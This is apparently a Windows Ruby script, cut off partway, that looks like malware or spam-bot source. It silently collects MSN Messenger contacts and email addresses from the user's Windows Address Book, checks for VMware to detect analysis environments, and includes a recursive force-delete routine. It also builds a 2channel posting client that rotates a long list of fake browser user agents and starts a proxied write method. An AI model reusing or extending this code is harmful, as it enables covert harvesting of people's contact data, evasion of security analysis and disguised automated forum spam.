#!ruby -Ks -d
$KCODE = 's'
require 'kconv'
require 'jcode'
require 'web/agent'
require 'win32ole'
require 'win32/registry'
module Api
 CloseHandle = Win32API.new('kernel32', 'CloseHandle', 'l', 'l')
 GetLastError = Win32API.new('kernel32', 'GetLastError', '', 'l')
 OpenProcess = Win32API.new('kernel32', 'OpenProcess', 'lll', 'l')
 GetModuleFileNameEx = Win32API.new('psapi', 'GetModuleFileNameEx', 'llpl', 'l')
 GetDriveType = Win32API.new('kernel32', 'GetDriveType', 'p', 'l')
 SevenZip = Win32API.new('7-zip32.dll', 'SevenZip', 'lppl', 'i')
 ShellExecute = Win32API.new('shell32', 'ShellExecute', 'llplll', 'l')
 def self.open_dir path
  begin
   path = File.expand_path(path)
   result = ShellExecute.call(0, 0, path, 0, 0, 1)
   if result > 32
    return true
   else
    raise result.to_s
   end
  rescue
   return false
  end
 end
 module Toolhelp32Snapshot
  CreateToolhelp32Snapshot = Win32API.new('kernel32', 'CreateToolhelp32Snapshot', 'll', 'l')
  Process32First = Win32API.new('kernel32', 'Process32First', 'lp', 'l')
  Process32Next = Win32API.new('kernel32', 'Process32Next', 'lp', 'l')
  
  def self.each flags ,process_id, &block
   begin
    handle_snap = CreateToolhelp32Snapshot.call(flags, process_id)
    process_entry = [296,0,0,0,0,0,0,0,0,"\0"*260].pack('lllllllllZ260')
    Process32First.call(handle_snap, process_entry)
    block.call(process_entry.unpack('lllllllllZ*'))
    while Process32Next.call(handle_snap, process_entry) != 0
     block.call(process_entry.unpack('lllllllllZ*'))
    end
   ensure
    CloseHandle.call(handle_snap)
    1
   end
  end
  def self.all? flags ,process_id, &block
   begin
    handle_snap = CreateToolhelp32Snapshot.call(flags, process_id)
    process_entry = [296,0,0,0,0,0,0,0,0,"\0"*260].pack('lllllllllZ260')
    Process32First.call(handle_snap, process_entry)
    begin
     if !block.call(process_entry.unpack('lllllllllZ*'))
      return false
     end
    end while Process32Next.call(handle_snap, process_entry) != 0
    return true
   ensure
    CloseHandle.call(handle_snap)
    1
   end
  end
  def self.any? flags ,process_id, &block
   begin
    handle_snap = CreateToolhelp32Snapshot.call(flags, process_id)
    process_entry = [296,0,0,0,0,0,0,0,0,"\0"*260].pack('lllllllllZ260')
    Process32First.call(handle_snap, process_entry)
    begin
     if (ret = block.call(process_entry.unpack('lllllllllZ*')))
      return ret
     end
    end while Process32Next.call(handle_snap, process_entry) != 0
    return false
   ensure
    CloseHandle.call(handle_snap)
    1
   end
  end
 end
end
module Processes
 def self.include? mod_name_reg
  if mod_name_reg.class == String
   mod_name_reg = Regexp.new(Regexp.escape(mod_name_reg))
  end
  Api::Toolhelp32Snapshot.any?(2, 0){|pe|
   pe[9] if mod_name_reg.match(pe[9])
  }
 end
 def self.get_pid mod_name_reg
  if mod_name_reg.class == String
   mod_name_reg = Regexp.new(mod_name_reg)
  end
  Api::Toolhelp32Snapshot.any?(2, 0){|pe|
   pe[2] if mod_name_reg.match(pe[9])
  }
 end
 def self.get_fullpath mod_name_reg
  begin
   return '' if !pid = get_pid(mod_name_reg)
   hProcess = Api::OpenProcess.call(0b11111111111 , 0, pid)
   if Api::GetModuleFileNameEx.call(hProcess, 0, fullpath = "\0"*1000, 1000) != 0
    fullpath.delete "\0"
   else
    ''
   end
  ensure
   Api::CloseHandle.call(hProcess)
  end
 end
end
class MSNMesse
 @accounts = {}
 
 def self.online?
  begin
   if ::Processes.include?('msnmsgr')
    messenger = WIN32OLE.new('Messenger.UIAutomation.1')
    if messenger.myFriendlyName != ''
     return true
    end
   end
  rescue
   return false
  ensure
   #
  end
 end
 def self.friendly_name
   WIN32OLE.new('Messenger.UIAutomation.1').myFriendlyName
 end
 def self.accounts
  @accounts
 end
 def self.get_active_account
  return false if !online?
  mail = WIN32OLE.new('Messenger.UIAutomation.1').mySigninName
  if accounts.key?(mail)
   #accounts[mail].update
   accounts[mail] = self.new(mail)
  else
   accounts[mail] = self.new(mail)
  end
 end
 
 attr :mail
 attr :name
 attr :friends
 def initialize mail
  msgr = WIN32OLE.new('Messenger.UIAutomation.1')
  @mail = mail
  @name = msgr.myFriendlyName
  @friends = {}
  grps = msgr.MyGroups
  for i in 0...grps.count
   grp = grps.item(i)
   grpcontacts = grp.Contacts
   @friends[grpname = grp.Name] = []
   for j in 0...grpcontacts.count
    contact = grpcontacts.item(j)
    @friends[grpname] << [contact.FriendlyName, contact.SigninName]
   end
  end
  @friends[''] = []
  mycontacts = msgr.MyContacts
  for i in 0...mycontacts.count
   name = mycontacts.item(i).FriendlyName
   mail = mycontacts.item(i).SigninName
   if !@friends.any?{|k, x|
     next if k == ''
     x.any?{|y|y.eql?([name, mail])}
    }
    @friends[''] << [name, mail]
   end
  end
 end
end
def get_address_list user
 begin
 s = []
 open('C:\Documents and Settings\\'+user+'\Application Data\Microsoft\Address Book\\'+user+'.wab'){|f|
  f.binmode
  f.read.scan(/((\0[!-~])+\0@(\0[!-~])+)/){|x|
   s << x[0].gsub("\0", '')
  }
 }

 s.sort!.uniq!
 i = 1
 while true
  str1 = s[i].match(/[^@]+@.../)[0]
  str2 = s[i-1].match(/[^@]+@.../)[0]
  if str1 == str2
   s.delete_at(i-1)
  else
   i += 1
  end
  break if i == s.size
 end
 s
 rescue
 return false
 end
end
def vmware?
 begin
  Win32::Registry::HKEY_LOCAL_MACHINE.open('SOFTWARE\VMware, Inc.\VMware Tools').close
  true
 rescue
  if $!.code == 2
   false
  else
   #raise
  end
 end
end
def delete_dir(dir)
 begin
 Dir.foreach(dir){|x|
  if !x.match(/^\.\.?/)
   if File.directory?(dir + x)
    if Dir.entries(dir + x).size <= 2
     File.chmod(0777, dir + x)
     Dir.delete(dir + x)
    else
     delete_dir(dir + x + '/')
    end
   else
    File.chmod(0777, dir + x)
    File.delete(dir + x)
   end
  end
 }
 Dir.delete(dir)
 rescue
  return nil
 end
 0
end
class TwoChannel
 DOMAIN = '2ch.net'
 MAX_RES_NUM = 1000
 DEFAULT_USER_AGENT = 'Mozilla/4.0 (compatible; MSIE 6.0; Win32); .NET CLR 1.0.3705)'
 USER_AGENT = [
'MSIE 6.0; Windows 2000',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Windows NT 5.1; iebar; .NET CLR 1.0.3705)',
'Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC Mac OS X; ja) Opera 8.01',
'Mozilla/4.0 (compatible; MSIE 6.0; Win32);',
'Mozilla/4.0 (compatible; MSIE 6.0; Win32); .NET CLR 1.0.3705)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Hotbar 4.4.6.0)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 4.0)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 4.0; BVG',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322; FDM)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MathPlayer 2.0; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Maxthon; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; T312461)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; i-Nav 3.0.1.0F; .NET CLR 1.0.3705; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; {FF0C8E09-3C86-44CB-834A-B8CEEC80A1D7}; iOpus-I-M)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1);',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 2.0.40607)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Alexa Toolbar)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; BrowserBob)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; DFO-MPO Internet Explorer 6.0)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ENGINE; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT))',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ESB{F40811EE-DF17-4BC9-8785-B362ABF34098}; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FDM)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FTDv3 Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.40607)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; AtHome033)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; HCI0449; .NET CLR 1.0.3705)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Maxthon;',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Maxthon; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; Maxthon; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; FunWebProducts; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.40607; .NET CLR 1.0.3705)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; NOKTURNAL KICKS ASS)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FDM;',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon; .NET CLR 1.1.4322; .NET CLR 2.0.41115)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Woningstichting Den Helder; .NET CLR 1.0.3705)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; i-NavFourF; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ja) Opera 8.02',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; tr) Opera 8.02',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.41115)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; MyIE2; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; MyIE2; Maxthon; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.6) Gecko/20040206 Firefox/0.8',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; ja-JP-mac; rv:1.8) Gecko/20051111 Firefox/1.5',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.8.2 (KHTML, like Gecko) Safari/85.8',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.5.6 (KHTML, like Gecko) Safari/125.12',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.11',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/85.8.2 (KHTML, like Gecko) Safari/85.8.1',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/85.8.5 (KHTML, like Gecko) Safari/85.8',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/103u (KHTML, like Gecko) Safari/100.1',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/124 (KHTML, like Gecko) Safari/125.1',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/125.4 (KHTML, like Gecko) Safari/125.9',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/312.1 (KHTML, like Gecko) Safari/312',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/312.1.1 (KHTML, like Gecko) Safari/312',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.6 ',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; nl-nl) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12',
'Mozilla/5.0 (Windows; U; Win 9x 4.90; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.6) Gecko/20040206 Firefox/0.8',
'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3',
'Mozilla/5.0 (Windows; U; Win98; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0',
'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.5) Gecko/20041108 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.5) Gecko/20041122 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-GB; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-GB; rv:1.7.5) Gecko/20041110 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8b) Gecko/20050118 Firefox/1.0+',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; fr-FR; rv:1.7.5) Gecko/20041108 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; it-IT; rv:1.7.5) Gecko/20041110 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; rv:1.7.3) Gecko/20040913 Firefox/0.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; rv:1.7.3) Gecko/20041001 Firefox/0.10.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.5) Gecko/20041108 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.5) Gecko/20041122 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.6) Gecko/20050226 Firefox/1.0.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.7.5) Gecko/20041110 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/0.9.2 StumbleUpon/1.994',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 StumbleUpon/1.999',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050223 Firefox/1.0.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b) Gecko/20050118 Firefox/1.0+',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.7.5) Gecko/20041210 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.7.5) Gecko/20041108 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.6) Gecko/20040206 Firefox/0.8',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20040614 Firefox/0.9',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20040707 Firefox/0.9.2',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20040803 Firefox/0.9.3',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20040913 Firefox/0.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20041001 Firefox/0.10.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8b) Gecko/20050212 Firefox/1.0+ (MOOX M3)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; rv:1.7.3) Gecko/20041001 Firefox/0.10.1',
'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.5) Gecko/20050103 Firefox/1.0',
'Mozilla/5.0 (X11; U; Linux i386; en-US; rv:1.7.5) Gecko/20041109 Firefox/1.0',
'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.7.5) Gecko/20041128 Firefox/1.0 (Debian package 1.0-4)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20040803 Firefox/0.9.3',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20041013 Firefox/0.9.3 (Ubuntu)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041111 Firefox/1.0',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041111 Firefox/1.0 (Debian package 1.0-2)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041116 Firefox/1.0 (Ubuntu) (Ubuntu package 1.0-2ubuntu3)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041119 Firefox/1.0',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041123 Firefox/1.0',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041128 Firefox/1.0 (Debian package 1.0-4)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041130 Firefox/1.0',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041214 Firefox/1.0 StumbleUpon/1.999',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041219 Firefox/1.0 (Debian package 1.0+dfsg.1-1)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20050110 Firefox/1.0 (Debian package 1.0+dfsg.1-2)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.6) Gecko/20050306 Firefox/1.0.1 (Debian package 1.0.1-2)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5',
'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.7) Gecko/20040708 Firefox/0.9',
'Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:1.6) Gecko/20040207 Firefox/0.8',
'Mozilla/5.0 (X11; U; Linux i686; nl-NL; rv:1.7.5) Gecko/20050221 Firefox/1.0 (Ubuntu) (Ubuntu package 1.0+dfsg.1-6ubuntu1)',
'Mozilla/5.0 (X11; U; Linux i686; rv:1.7.3) Gecko/20040913 Firefox/0.10',
'Mozilla/5.0 (X11; U; Linux i686; rv:1.7.3) Gecko/20041001 Firefox/0.10.1',
'Mozilla/5.0 (X11; U; Linux i686; rv:1.8b) Gecko/20050124 Firefox/1.0+',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7) Gecko/20041013 Firefox/0.9.3 (Ubuntu)',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0',
'Opera/8.0 (X11; Linux i686; U; ja)',
'Opera/8.01 (Windows ME; U; ja)',
'Monazilla/1.00 (cockcrow/2.5.2.9)',
'Monazilla/1.00 (cockcrow/2.5.5.2)',
'Monazilla/1.00 (compatible; MSIE 6.0; X11; Linux i686)',
'Monazilla/1.00 Live2ch/1.01',
'Monazilla/1.00 gikoNavi/beta51',
'Monazilla/1.00 gikoNavi/beta52',
'Monazilla/1.00 gikoNavi/beta53',
'Monazilla/1.00 gikoNavi/beta54',
'Monazilla/1.00 gikoNavi/beta55',
'Monazilla/1.00 kage/0.99.1.1034 ',
'Monazilla/1.00 kage/0.99.1.1036',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1'
]
 @user_agent = DEFAULT_USER_AGENT
 def self.user_agent
  @user_agent
 end
 def self.set_user_agent random = true
  if rand(2) == 0 and random
   @user_agent = @user_agent.chop + rand(10).to_s
  else
   @user_agent = USER_AGENT.rnd
  end
 end
 def self.bbs_board_url
  agent = Web::Agent.new
  agent.req.header['User-Agent'] = TwoChannel::user_agent
  agent.req.header['Referer'] = ""
  agent.get 'http://www.google.com/search?num=10&hl=ja&c2coff=1&q=bbs-menu-for-2ch+%E3%83%8B%E3%83%A5%E3%83%BC%E3%82%B9%E9%80%9F%E5%A0%B1&lr=lang_ja'
  @urls = []
  agent.rsp.body.scan(/<a class=l href="([!-~]+)".+BBS MENU/){|url|
   @urls << url
  }
  return @urls.rnd
 end
 def self.get_board_by_name bbsname
  agent = Web::Agent.new
  agent.req.header['User-Agent'] = user_agent
  agent.req.header['Referer'] = ""
  begin
   agent.get bbs_board_url
  end while !(ret = agent.rsp.body.match(/<A HREF=http:\/\/([!-~]+)\.2ch\.net\/([!-~]+)\/>#{bbsname}<\/A>/))
  p ret[1], ret[2] if $DEBUG
  return Board.new(ret[1], ret[2])
 end
end
class TwoChannel::Board
 attr :host
 attr :dir
 attr :samba
 attr :settings
 attr_accessor :cookie
 attr_accessor :time_count
 def initialize host, dir
  @host = host
  @dir = dir
  @samba = 30
  @tmp_wait = 0
  @threads = {}
  @cookie = ''
  @time_count = 0
  
  get_settings
  get_threads
 end
 def url
  "#{@host}.2ch.net/#{@dir}/"
 end
 def time
  (Time.now.to_i - @time_count * 30).to_s
 end
 def tmp_wait
  sleep @tmp_wait
  @tmp_wait = 0
 end
 def set_tmp_wait x
  @tmp_wait = x.to_i
 end
 def wait
  sleep(@samba + 8)
 end
 def set_wait x
  @samba = x.to_i
 end
 def get_settings
  agent = Web::Agent.new
  agent.req.header['User-Agent'] = TwoChannel::user_agent
  agent.req.header['Referer'] = ""
  agent.get "http://#{@host}.2ch.net/#{@dir}/SETTING.TXT"
  if agent.rsp.body.include?('<title>Ç‡Ç§Ç∏Ç¡Ç∆êlëÂêô</title>')
   agent.req.header['User-Agent'] = TwoChannel::user_agent
   agent.req.header['Referer'] = ""
   agent.get "http://#{@host}.2ch.net/#{@dir}/"
   tmp, @host, @dir = *(agent.rsp.body.match(/<A HREF="?http:\/\/([!-~]+)\.2ch\.net\/([!-~]+)\/"?>/i))
   sleep 1
   return get_settings
  end
  @settings = {}
  agent.rsp.body.scan(/^(\w+)=(.*)$/){|key, val|
   @settings[key] = val
  }
  if @settings.size < 3
   p agent.rsp.body if $DEBUG
   raise 'No SETTING.TXT Error'
  end
  sleep 1
  return @settings
 end
 def get_threads
  agent = Web::Agent.new
  agent.req.header['User-Agent'] = TwoChannel::user_agent
  agent.req.header['Referer'] = ""
  agent.get "http://#{@host}.2ch.net/#{@dir}/subject.txt"
  @threads.each_value{|x|
   x.dat_oti = true
  }
  i = 0
  agent.rsp.body.scan(/^(\d+)\.dat<>(.+) +\((\d+)\)$/){|key, title, res_num|
   add_thread(key, title, res_num, i)
   i += 1
  }
  @threads.delete_if{|key, value|
   value.dat_oti
  }
  @thread_num = i
  if @thread_num < 10
   raise 'No Thread Error'
  end
  sleep 1
  return @threads
 end
 def add_thread key, title, res_num, rank
  if key.to_s.match(/^9/)
   return false
  end
  if !@threads.has_key?(key)
   @threads[key] = Thread.new(self, key, title, res_num, rank)
  else
   @threads[key].res_num = res_num
   @threads[key].rank  = rank
   @threads[key].dat_oti = false
   @threads[key].update?
  end
  @threads[key]
 end
 def threads writable = true
  if writable
   @threads.values.select{|x| x.writable?}
  else
   @threads.values
  end
 end
 def thread_by_key key
  @threads[key]
 end
 def include_title title, writable = true
  threads(writable).select{|x| x.title.match(title)}
 end
 def include_title_match_word title, writable = false
   threads(writable).map{|x| x.title.match(title).to_a[0]}.compact.uniq
 end
 def max_res writable = true
  threads(true).max{|a, b| a.res_num - b.res_num}
 end
 def min_res writable = true
  threads(true).min{|a, b| a.res_num - b.res_num}
 end
 def last writable = true
  threads(true).max{|a, b| a.rank - b.rank}
 end
 def first writable = true
  threads(true).min{|a, b| a.rank - b.rank}
 end
 def latest writable = true
  threads(true).max{|a, b| a.key - b.key}
 end
 def oldest writable = true
  threads(true).min{|a, b| a.key - b.key}
 end
 def sort_rank writable = true
  threads(true).sort_by{|a| a.rank}
 end
 def sort_res writable = true
  threads(true).sort_by{|a| a.res_num}
 end
 def sort_old writable = true
  threads(true).sort_by{|a| a.key}
 end
end
class TwoChannel::Board::Thread
 attr :key
 attr :title
 attr :org_title
 attr :res_num
 attr :rank
 attr_accessor :dat_oti
 def initialize board, key, title, res_num, rank, optm = true
  @board = board
  @key = key.to_i
  @res_num = res_num.to_i
  @rank = rank.to_i
  @title = optm ? title.optimize : title
  @org_title = title
  @over_size = false
  @dat_oti = false
 end
 def inspect
  "Thread: key=#{@key} title=#{@title} res=#{@res_num} over_size=#{@over_size}"
 end
 def read
  agent = Web::Agent.new
  agent.req.header['User-Agent'] = TwoChannel::user_agent
  agent.get "http://#{@board.host}.2ch.net/#{@board.dir}/dat/#{key}.dat"
  #p agent.rsp.body[-50, 50] if $DEBUG
   if agent.rsp.body.include?('<?xml')
    agent.rsp.body.match(/<\!\[CDATA\[\n(.*)\]\]>/m)[1]
   else
    agent.rsp.body
   end
 end
 def write name, mail, message, proxy_host = nil, proxy_port = nil, hana = nil
  begin
   agent = Web::Agent.new
   agent.proxy_host = proxy_host
